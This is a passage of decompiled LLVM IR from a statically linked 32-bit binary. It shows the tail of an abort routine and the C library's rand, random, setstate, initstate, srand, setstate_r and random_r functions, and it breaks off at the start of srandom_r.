  store i32 0, i32* %v5_8050be3, align 4
  %v0_8050bee.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8050bee = add i32 %v0_8050bee.pre, -1
  %v9_8050bee = icmp slt i32 %v1_8050bee, 0
  store i32 %v1_8050bee, i32* %eax.global-to-local, align 4
  %v1_8050bef = icmp eq i1 %v9_8050bee, false
  br i1 %v1_8050bef, label %dec_label_pc_8050be3.dec_label_pc_8050be3_crit_edge, label %dec_label_pc_8050bf1

dec_label_pc_8050be3.dec_label_pc_8050be3_crit_edge: ; preds = %dec_label_pc_8050be3
  %v0_8050be3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050be3

dec_label_pc_8050bf1:                             ; preds = %dec_label_pc_8050be3
  %v0_8050bf1 = load i32, i32* @ebx, align 4
  %v2_8050bf5 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8050bf5, i32* @ebx, align 4
  %v4_8050bfd = call i32 @__sigaddset(i32 %v2_8050bf5, i32 6, i32 %v0_8050bf1, i32 %v0_8050bf1)
  store i32 %v4_8050bfd, i32* %eax.global-to-local, align 4
  %v1_8050c05 = icmp eq i32 %v4_8050bfd, 0
  %v1_8050c07 = icmp eq i1 %v1_8050c05, false
  br i1 %v1_8050c07, label %dec_label_pc_8050c17, label %dec_label_pc_8050c09

dec_label_pc_8050c09:                             ; preds = %dec_label_pc_8050bf1
  %v3_8050c0f = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8050c0f = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_8050c0f, i32 0)
  store i32 %v4_8050c0f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c17

dec_label_pc_8050c17:                             ; preds = %dec_label_pc_8050bf1, %dec_label_pc_8050c09
  %v2_8050c4f4 = phi i32 [ %v4_8050bfd, %dec_label_pc_8050bf1 ], [ %v4_8050c0f, %dec_label_pc_8050c09 ]
  %v0_8050c17 = load i8, i8* @global_var_805fd40.246, align 64
  %v1_8050c17 = icmp eq i8 %v0_8050c17, 0
  %v1_8050c1e = icmp eq i1 %v1_8050c17, false
  br i1 %v1_8050c1e, label %dec_label_pc_8050c4f, label %dec_label_pc_8050c20

dec_label_pc_8050c20:                             ; preds = %dec_label_pc_8050c17
  store i8 1, i8* @global_var_805fd40.246, align 64
  br label %dec_label_pc_8050c27

dec_label_pc_8050c27:                             ; preds = %dec_label_pc_8050c8e, %dec_label_pc_8050c20
  %v1_8050c2f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80599c8.245 to i32))
  store i32 %v1_8050c2f, i32* %eax.global-to-local, align 4
  %v1_8050c3b = call i32 @__raise(i32 6)
  store i32 %v1_8050c3b, i32* %eax.global-to-local, align 4
  %v1_8050c47 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80599c8.245 to i32))
  store i32 %v1_8050c47, i32* %eax.global-to-local, align 4
  %v0_8050c4f.pre = load i8, i8* @global_var_805fd40.246, align 64
  br label %dec_label_pc_8050c4f

dec_label_pc_8050c4f:                             ; preds = %dec_label_pc_8050c17, %dec_label_pc_8050c27
  %v2_8050c4f = phi i32 [ %v2_8050c4f4, %dec_label_pc_8050c17 ], [ %v1_8050c47, %dec_label_pc_8050c27 ]
  %v0_8050c4f = phi i8 [ %v0_8050c17, %dec_label_pc_8050c17 ], [ %v0_8050c4f.pre, %dec_label_pc_8050c27 ]
  %v1_8050c4f = zext i8 %v0_8050c4f to i32
  %v3_8050c4f = and i32 %v2_8050c4f, -256
  %v4_8050c4f = or i32 %v1_8050c4f, %v3_8050c4f
  store i32 %v4_8050c4f, i32* %eax.global-to-local, align 4
  %v10_8050c54 = icmp eq i8 %v0_8050c4f, 1
  %v1_8050c56 = icmp eq i1 %v10_8050c54, false
  br i1 %v1_8050c56, label %dec_label_pc_8050cb0, label %dec_label_pc_8050c58

dec_label_pc_8050c58:                             ; preds = %dec_label_pc_8050c4f
  store i8 2, i8* @global_var_805fd40.246, align 64
  %v2_8050c67 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8050c67, i32* %eax.global-to-local, align 4
  %v3_8050c6c = bitcast i32* %stack_var_-272 to i8*
  %v4_8050c6c = call i32 @__GI_memset(i8* %v3_8050c6c, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c83

dec_label_pc_8050c83:                             ; preds = %dec_label_pc_8050c83.dec_label_pc_8050c83_crit_edge, %dec_label_pc_8050c58
  %v0_8050c83 = phi i32 [ %v12_8050bde, %dec_label_pc_8050c58 ], [ %v0_8050c83.pre, %dec_label_pc_8050c83.dec_label_pc_8050c83_crit_edge ]
  %v1_8050c8b21 = phi i32 [ 31, %dec_label_pc_8050c58 ], [ %v1_8050c8b, %dec_label_pc_8050c83.dec_label_pc_8050c83_crit_edge ]
  %v2_8050c83 = mul i32 %v1_8050c8b21, 4
  %v3_8050c83 = add i32 %v2_8050c83, 16
  %v4_8050c83 = add i32 %v3_8050c83, %v0_8050c83
  %v5_8050c83 = inttoptr i32 %v4_8050c83 to i32*
  store i32 -1, i32* %v5_8050c83, align 4
  %v0_8050c8b.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8050c8b = add i32 %v0_8050c8b.pre, -1
  %v9_8050c8b = icmp slt i32 %v1_8050c8b, 0
  store i32 %v1_8050c8b, i32* %eax.global-to-local, align 4
  %v1_8050c8c = icmp eq i1 %v9_8050c8b, false
  br i1 %v1_8050c8c, label %dec_label_pc_8050c83.dec_label_pc_8050c83_crit_edge, label %dec_label_pc_8050c8e

dec_label_pc_8050c83.dec_label_pc_8050c83_crit_edge: ; preds = %dec_label_pc_8050c83
  %v0_8050c83.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050c83

dec_label_pc_8050c8e:                             ; preds = %dec_label_pc_8050c83
  store i32 %v2_8050c67, i32* %eax.global-to-local, align 4
  %v4_8050ca3 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8050ca3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050c27

dec_label_pc_8050cb0:                             ; preds = %dec_label_pc_8050c4f
  %v10_8050cb0 = icmp eq i8 %v0_8050c4f, 2
  %v1_8050cb2 = icmp eq i1 %v10_8050cb0, false
  br i1 %v1_8050cb2, label %dec_label_pc_8050cbc, label %dec_label_pc_8050cbc.thread

dec_label_pc_8050cbc.thread:                      ; preds = %dec_label_pc_8050cb0
  store i8 3, i8* @global_var_805fd40.246, align 64
  br label %dec_label_pc_8050cc5

dec_label_pc_8050cbc:                             ; preds = %dec_label_pc_8050cb0
  %v9_8050cbc = icmp eq i8 %v0_8050c4f, 3
  %v1_8050cc3 = icmp eq i1 %v9_8050cbc, false
  br i1 %v1_8050cc3, label %dec_label_pc_8050cd6, label %dec_label_pc_8050cc5

dec_label_pc_8050cc5:                             ; preds = %dec_label_pc_8050cbc.thread, %dec_label_pc_8050cbc
  store i8 4, i8* @global_var_805fd40.246, align 64
  %v1_8050cd1 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8050cd6:                             ; preds = %dec_label_pc_8050cbc, %dec_label_pc_8050cd6
  br label %dec_label_pc_8050cd6

; uselistorder directives
  uselistorder i32 %v1_8050c8b, { 2, 1, 0 }
  uselistorder i32 %v1_8050bee, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 6, 7, 9, 8, 1, 10, 11, 12, 13, 14, 2, 3, 5, 4, 0 }
  uselistorder i8 3, { 0, 4, 3, 1, 2 }
  uselistorder i8* @global_var_805fd40.246, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8050cd6, { 1, 0 }
  uselistorder label %dec_label_pc_8050cc5, { 1, 0 }
  uselistorder label %dec_label_pc_8050c4f, { 1, 0 }
  uselistorder label %dec_label_pc_8050c17, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_8050cdc = call i32 @random()
  ret i32 %v0_8050cdc

; uselistorder directives
  uselistorder i32 ()* @random, { 11, 5, 4, 3, 2, 1, 0, 9, 8, 7, 6, 10 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050ce4 = load i32, i32* @ebx, align 4
  store i32 %v0_8050ce4, i32* %stack_var_-4, align 4
  %v2_8050cf2 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050cf2, i32* @ebx, align 4
  %v2_8050cf7 = call i32 @__pthread_return_void(i32 %v2_8050cf2, i32 134550975)
  %v1_8050d03 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80599e0.247 to i32))
  %v2_8050d0a = ptrtoint i32* %stack_var_-8 to i32
  %v3_8050d14 = call i32 @__GI_random_r(i32* nonnull @global_var_80599f8, i32 %v2_8050d0a)
  store i32 ptrtoint (i32* @global_var_80599f8 to i32), i32* @eax, align 4
  %v2_8050d1e = call i32 @__pthread_return_void(i32 %v2_8050cf2, i32 1)
  %v3_8050d23 = load i32, i32* %stack_var_-8, align 4
  %v2_8050d2a = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050d2a, i32* @ebx, align 4
  ret i32 %v3_8050d23
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_8050d3d = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050d3d, i32* @eax, align 4
  %v2_8050d42 = call i32 @__pthread_return_void(i32 %v2_8050d3d, i32 134550975)
  %v1_8050d4e = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80599e0.247 to i32))
  %v0_8050d5a = load i32, i32* bitcast (i32** @global_var_8059a00.250 to i32*), align 512
  store i32 %v0_8050d5a, i32* @ebx, align 4
  %v3_8050d64 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_80599f8)
  %v2_8050d6c = icmp slt i32 %v3_8050d64, 0
  br i1 %v2_8050d6c, label %dec_label_pc_8050d73, label %dec_label_pc_8050d70

dec_label_pc_8050d70:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_80599fc.251 to i32), i32* @esi, align 4
  br label %dec_label_pc_8050d73

dec_label_pc_8050d73:                             ; preds = %entry, %dec_label_pc_8050d70
  store i32 %v2_8050d3d, i32* @eax, align 4
  %v2_8050d7c = call i32 @__pthread_return_void(i32 %v2_8050d3d, i32 1)
  %v0_8050d81 = load i32, i32* @esi, align 4
  ret i32 %v0_8050d81

; uselistorder directives
  uselistorder label %dec_label_pc_8050d73, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_8050d98 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8050d98, i32* @ebx, align 4
  %v2_8050d9d = call i32 @__pthread_return_void(i32 %v2_8050d98, i32 134550975)
  %v1_8050da9 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80599e0.247 to i32))
  %v0_8050db3 = load i32, i32* bitcast (i32** @global_var_8059a00.250 to i32*), align 512
  store i32 %v0_8050db3, i32* @esi, align 4
  %v4_8050dc5 = inttoptr i32 %arg2 to i32*
  %v5_8050dc5 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_8050dc5, i32 %arg3, i32 ptrtoint (i32* @global_var_80599f8 to i32))
  store i32 %v5_8050dc5, i32* @eax, align 4
  %v2_8050dd0 = call i32 @__pthread_return_void(i32 %v2_8050d98, i32 1)
  ret i32 ptrtoint (i32** @global_var_80599fc.251 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050de0 = load i32, i32* @ebx, align 4
  store i32 %v0_8050de0, i32* %stack_var_-4, align 4
  %v2_8050dee = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8050dee, i32* @ebx, align 4
  %v2_8050df3 = call i32 @__pthread_return_void(i32 %v2_8050dee, i32 134550975)
  %v1_8050dff = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_80599e0.247 to i32))
  %v2_8050e0f = sext i32 %arg1 to i64
  %v3_8050e0f = call i32 @srandom_r(i64 %v2_8050e0f, i32 ptrtoint (i32* @global_var_80599f8 to i32))
  store i32 ptrtoint (i32* @global_var_80599f8 to i32), i32* @eax, align 4
  %v2_8050e19 = call i32 @__pthread_return_void(i32 %v2_8050dee, i32 1)
  %v2_8050e21 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050e21, i32* @ebx, align 4
  ret i32 %v2_8050e19

; uselistorder directives
  uselistorder i32* @global_var_80599f8, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_80599f8 to i32), { 1, 3, 2, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %v0_8050e27 = load i32, i32* @ebx, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v1_8050e33 = add i32 %arg1, 4
  store i32 %v1_8050e33, i32* %esi.global-to-local, align 4
  %v1_8050e36 = add i32 %tmp4, 12
  %v2_8050e36 = inttoptr i32 %v1_8050e36 to i32*
  %v3_8050e36 = load i32, i32* %v2_8050e36, align 4
  store i32 %v3_8050e36, i32* %ecx.global-to-local, align 4
  %v1_8050e39 = add i32 %tmp4, 8
  %v2_8050e39 = inttoptr i32 %v1_8050e39 to i32*
  %v3_8050e39 = load i32, i32* %v2_8050e39, align 4
  %v1_8050e3c = icmp eq i32 %v3_8050e36, 0
  %v1_8050e3e = icmp eq i1 %v1_8050e3c, false
  br i1 %v1_8050e3e, label %dec_label_pc_8050e49, label %dec_label_pc_8050e40

dec_label_pc_8050e40:                             ; preds = %entry
  %v1_8050e40 = add i32 %v3_8050e39, -4
  %v2_8050e40 = inttoptr i32 %v1_8050e40 to i32*
  store i32 0, i32* %v2_8050e40, align 4
  br label %dec_label_pc_8050e59

dec_label_pc_8050e49:                             ; preds = %entry
  %v1_8050e49 = add i32 %tmp4, 4
  %v2_8050e49 = inttoptr i32 %v1_8050e49 to i32*
  %v3_8050e49 = load i32, i32* %v2_8050e49, align 4
  %v2_8050e4c = sub i32 %v3_8050e49, %v3_8050e39
  %v2_8050e4e = sdiv i32 %v2_8050e4c, 4
  %v3_8050e51 = mul i32 %v2_8050e4e, 5
  %v2_8050e54 = add i32 %v3_8050e51, %v3_8050e36
  store i32 %v2_8050e54, i32* %eax.global-to-local, align 4
  %v2_8050e56 = add i32 %v3_8050e39, -4
  %v3_8050e56 = inttoptr i32 %v2_8050e56 to i32*
  store i32 %v2_8050e54, i32* %v3_8050e56, align 4
  br label %dec_label_pc_8050e59

dec_label_pc_8050e59:                             ; preds = %dec_label_pc_8050e40, %dec_label_pc_8050e49
  %v0_8050e59 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050e59 = add i32 %v0_8050e59, -4
  %v2_8050e59 = inttoptr i32 %v1_8050e59 to i32*
  %v3_8050e59 = load i32, i32* %v2_8050e59, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_8050e61 = ashr i32 %v3_8050e59, 31
  %v2_8050e62 = zext i32 %v3_8050e59 to i64
  %v4_8050e62 = zext i32 %v1_8050e61 to i64
  %v5_8050e62 = mul nuw i64 %v4_8050e62, 4294967296
  %v6_8050e62 = or i64 %v5_8050e62, %v2_8050e62
  %v8_8050e62 = sdiv i64 %v6_8050e62, 5
  %v9_8050e62 = trunc i64 %v8_8050e62 to i32
  store i32 %v9_8050e62, i32* %eax.global-to-local, align 4
  %v10_8050e62 = srem i64 %v6_8050e62, 5
  %v11_8050e62 = trunc i64 %v10_8050e62 to i32
  %v6_8050e67 = icmp ugt i32 %v11_8050e62, 4
  br i1 %v6_8050e67, label %dec_label_pc_8050ea7, label %dec_label_pc_8050e69

dec_label_pc_8050e69:                             ; preds = %dec_label_pc_8050e59
  %v1_8050e69 = mul i32 %v11_8050e62, 4
  %v2_8050e69 = add i32 %v1_8050e69, ptrtoint (i32* @global_var_8057a34.252 to i32)
  %v3_8050e69 = inttoptr i32 %v2_8050e69 to i32*
  %v4_8050e69 = load i32, i32* %v3_8050e69, align 4
  store i32 %v4_8050e69, i32* %ecx.global-to-local, align 4
  %v2_8050e70 = add i32 %v1_8050e69, ptrtoint (i32* @global_var_8057a20.253 to i32)
  %v3_8050e70 = inttoptr i32 %v2_8050e70 to i32*
  %v4_8050e70 = load i32, i32* %v3_8050e70, align 4
  store i32 %v4_8050e70, i32* %ebp.global-to-local, align 4
  %v1_8050e77 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050e77 = add i32 %v1_8050e77, 16
  %v3_8050e77 = inttoptr i32 %v2_8050e77 to i32*
  store i32 %v4_8050e69, i32* %v3_8050e77, align 4
  %v0_8050e7a = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050e7a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050e7a = add i32 %v1_8050e7a, 20
  %v3_8050e7a = inttoptr i32 %v2_8050e7a to i32*
  store i32 %v0_8050e7a, i32* %v3_8050e7a, align 4
  %v1_8050e7d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050e7d = add i32 %v1_8050e7d, 12
  %v3_8050e7d = inttoptr i32 %v2_8050e7d to i32*
  store i32 %v11_8050e62, i32* %v3_8050e7d, align 4
  %v1_8050e80 = icmp eq i32 %v11_8050e62, 0
  br i1 %v1_8050e80, label %dec_label_pc_8050e9a, label %dec_label_pc_8050e84

dec_label_pc_8050e84:                             ; preds = %dec_label_pc_8050e69
  %v0_8050e84 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050e84 = add i32 %v0_8050e84, -4
  %v2_8050e84 = inttoptr i32 %v1_8050e84 to i32*
  %v3_8050e84 = load i32, i32* %v2_8050e84, align 4
  %v1_8050e87 = ashr i32 %v3_8050e84, 31
  %v0_8050e88 = load i32, i32* %edi.global-to-local, align 4
  %v2_8050e88 = zext i32 %v3_8050e84 to i64
  %v4_8050e88 = zext i32 %v1_8050e87 to i64
  %v5_8050e88 = mul nuw i64 %v4_8050e88, 4294967296
  %v6_8050e88 = or i64 %v5_8050e88, %v2_8050e88
  %v7_8050e88 = zext i32 %v0_8050e88 to i64
  %v8_8050e88 = sdiv i64 %v6_8050e88, %v7_8050e88
  %v9_8050e88 = trunc i64 %v8_8050e88 to i32
  %v2_8050e8a = mul i32 %v9_8050e88, 4
  %v3_8050e8a = add i32 %v2_8050e8a, %v0_8050e84
  %v1_8050e8d = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050e8d = add i32 %v1_8050e8d, %v9_8050e88
  store i32 %v2_8050e8d, i32* %eax.global-to-local, align 4
  %v1_8050e8f = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050e8f = add i32 %v1_8050e8f, 4
  %v3_8050e8f = inttoptr i32 %v2_8050e8f to i32*
  store i32 %v3_8050e8a, i32* %v3_8050e8f, align 4
  %v0_8050e92 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e92 = ashr i32 %v0_8050e92, 31
  %v0_8050e93 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050e93 = zext i32 %v0_8050e92 to i64
  %v4_8050e93 = zext i32 %v1_8050e92 to i64
  %v5_8050e93 = mul nuw i64 %v4_8050e93, 4294967296
  %v6_8050e93 = or i64 %v5_8050e93, %v2_8050e93
  %v7_8050e93 = zext i32 %v0_8050e93 to i64
  %v8_8050e93 = sdiv i64 %v6_8050e93, %v7_8050e93
  %v9_8050e93 = trunc i64 %v8_8050e93 to i32
  store i32 %v9_8050e93, i32* %eax.global-to-local, align 4
  %v10_8050e93 = srem i64 %v6_8050e93, %v7_8050e93
  %v11_8050e93 = trunc i64 %v10_8050e93 to i32
  %v0_8050e95 = load i32, i32* %esi.global-to-local, align 4
  %v2_8050e95 = mul i32 %v11_8050e93, 4
  %v3_8050e95 = add i32 %v2_8050e95, %v0_8050e95
  %v1_8050e98 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050e98 = inttoptr i32 %v1_8050e98 to i32*
  store i32 %v3_8050e95, i32* %v2_8050e98, align 4
  br label %dec_label_pc_8050e9a

dec_label_pc_8050e9a:                             ; preds = %dec_label_pc_8050e69, %dec_label_pc_8050e84
  %v0_8050e9a = load i32, i32* %esi.global-to-local, align 4
  %v1_8050e9a = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050e9a = mul i32 %v1_8050e9a, 4
  %v3_8050e9a = add i32 %v2_8050e9a, %v0_8050e9a
  store i32 %v3_8050e9a, i32* %eax.global-to-local, align 4
  %v1_8050e9d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050e9d = add i32 %v1_8050e9d, 8
  %v3_8050e9d = inttoptr i32 %v2_8050e9d to i32*
  store i32 %v0_8050e9a, i32* %v3_8050e9d, align 4
  %v0_8050ea0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ea0 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050ea0 = add i32 %v1_8050ea0, 24
  %v3_8050ea0 = inttoptr i32 %v2_8050ea0 to i32*
  store i32 %v0_8050ea0, i32* %v3_8050ea0, align 4
  br label %dec_label_pc_8050eb5

dec_label_pc_8050ea7:                             ; preds = %dec_label_pc_8050e59
  %v1_8050ea7 = call i32 @__errno_location(i32 %v0_8050e27)
  store i32 %v1_8050ea7, i32* %eax.global-to-local, align 4
  %v1_8050eac = inttoptr i32 %v1_8050ea7 to i32*
  store i32 22, i32* %v1_8050eac, align 4
  br label %dec_label_pc_8050eb5

dec_label_pc_8050eb5:                             ; preds = %dec_label_pc_8050e9a, %dec_label_pc_8050ea7
  %storemerge = phi i32 [ -1, %dec_label_pc_8050ea7 ], [ 0, %dec_label_pc_8050e9a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8050e27, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8050e9a, { 1, 0 }
  uselistorder i32 %v11_8050e62, { 2, 1, 3, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i64 5, { 1, 0 }
  uselistorder label %dec_label_pc_8050eb5, { 1, 0 }
  uselistorder label %dec_label_pc_8050e9a, { 1, 0 }
  uselistorder label %dec_label_pc_8050e59, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_8050ec0 = load i32, i32* @ebx, align 4
  store i32 %v0_8050ec0, i32* %stack_var_-16, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8050ec9 = add i32 %tmp2, 8
  %v2_8050ec9 = inttoptr i32 %v1_8050ec9 to i32*
  %v3_8050ec9 = load i32, i32* %v2_8050ec9, align 4
  store i32 %v3_8050ec9, i32* %esi.global-to-local, align 4
  %v1_8050ecc = add i32 %tmp2, 12
  %v2_8050ecc = inttoptr i32 %v1_8050ecc to i32*
  %v3_8050ecc = load i32, i32* %v2_8050ecc, align 4
  %v4_8050ecc = icmp eq i32 %v3_8050ecc, 0
  %v1_8050ed0 = icmp eq i1 %v4_8050ecc, false
  br i1 %v1_8050ed0, label %dec_label_pc_8050ee9, label %dec_label_pc_8050ed2

dec_label_pc_8050ed2:                             ; preds = %entry
  %v2_8050ed2 = inttoptr i32 %v3_8050ec9 to i32*
  %v3_8050ed2 = load i32, i32* %v2_8050ed2, align 4
  %v5_8050ed2 = mul i32 %v3_8050ed2, 1103515245
  %v1_8050ed8 = add i32 %v5_8050ed2, 12345
  %v1_8050edd = urem i32 %v1_8050ed8, -2147483648
  store i32 %v1_8050edd, i32* %eax.global-to-local, align 4
  store i32 %v1_8050edd, i32* %v2_8050ed2, align 4
  %v0_8050ee4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ee4 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050ee4 = inttoptr i32 %v1_8050ee4 to i32*
  store i32 %v0_8050ee4, i32* %v2_8050ee4, align 4
  br label %dec_label_pc_8050f15

dec_label_pc_8050ee9:                             ; preds = %entry
  %v1_8050ee9 = add i32 %tmp2, 4
  %v2_8050ee9 = inttoptr i32 %v1_8050ee9 to i32*
  %v3_8050ee9 = load i32, i32* %v2_8050ee9, align 4
  store i32 %v3_8050ee9, i32* %ecx.global-to-local, align 4
  %v2_8050eec = load i32, i32* %arg1, align 4
  store i32 %v2_8050eec, i32* %edx.global-to-local, align 4
  %v1_8050eee = add i32 %tmp2, 24
  %v2_8050eee = inttoptr i32 %v1_8050eee to i32*
  %v3_8050eee = load i32, i32* %v2_8050eee, align 4
  store i32 %v3_8050eee, i32* %edi.global-to-local, align 4
  %v1_8050ef1 = inttoptr i32 %v3_8050ee9 to i32*
  %v2_8050ef1 = load i32, i32* %v1_8050ef1, align 4
  store i32 %v2_8050ef1, i32* %eax.global-to-local, align 4
  %v1_8050ef3 = inttoptr i32 %v2_8050eec to i32*
  %v2_8050ef3 = load i32, i32* %v1_8050ef3, align 4
  %v4_8050ef3 = add i32 %v2_8050ef3, %v2_8050ef1
  store i32 %v4_8050ef3, i32* %v1_8050ef3, align 4
  %v0_8050ef5 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050ef5 = inttoptr i32 %v0_8050ef5 to i32*
  %v2_8050ef5 = load i32, i32* %v1_8050ef5, align 4
  %v1_8050ef7 = add i32 %v0_8050ef5, 4
  store i32 %v1_8050ef7, i32* %edx.global-to-local, align 4
  %v2_8050efa = udiv i32 %v2_8050ef5, 2
  %v1_8050efc = load i32, i32* %edi.global-to-local, align 4
  %v7_8050efc = icmp ult i32 %v1_8050ef7, %v1_8050efc
  %v1_8050efe = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050efe = inttoptr i32 %v1_8050efe to i32*
  store i32 %v2_8050efa, i32* %v2_8050efe, align 4
  %v0_8050f01 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050f01 = add i32 %v0_8050f01, 4
  store i32 %v1_8050f01, i32* %eax.global-to-local, align 4
  br i1 %v7_8050efc, label %dec_label_pc_8050f0a, label %dec_label_pc_8050f06

dec_label_pc_8050f06:                             ; preds = %dec_label_pc_8050ee9
  %v0_8050f06 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8050f06, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050f10

dec_label_pc_8050f0a:                             ; preds = %dec_label_pc_8050ee9
  %v1_8050f0a = load i32, i32* %edi.global-to-local, align 4
  %v7_8050f0a = icmp ult i32 %v1_8050f01, %v1_8050f0a
  br i1 %v7_8050f0a, label %dec_label_pc_8050f10, label %dec_label_pc_8050f0e

dec_label_pc_8050f0e:                             ; preds = %dec_label_pc_8050f0a
  %v0_8050f0e = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8050f0e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050f10

dec_label_pc_8050f10:                             ; preds = %dec_label_pc_8050f0a, %dec_label_pc_8050f06, %dec_label_pc_8050f0e
  %v0_8050f10 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050f10 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050f10 = inttoptr i32 %v1_8050f10 to i32*
  store i32 %v0_8050f10, i32* %v2_8050f10, align 4
  %v0_8050f12 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050f12 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050f12 = add i32 %v1_8050f12, 4
  %v3_8050f12 = inttoptr i32 %v2_8050f12 to i32*
  store i32 %v0_8050f12, i32* %v3_8050f12, align 4
  br label %dec_label_pc_8050f15

dec_label_pc_8050f15:                             ; preds = %dec_label_pc_8050ed2, %dec_label_pc_8050f10
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8050f17 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8050f17, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8050edd, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8050f15, { 1, 0 }
  uselistorder label %dec_label_pc_8050f10, { 2, 0, 1 }
}

define i32 @srandom_r(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
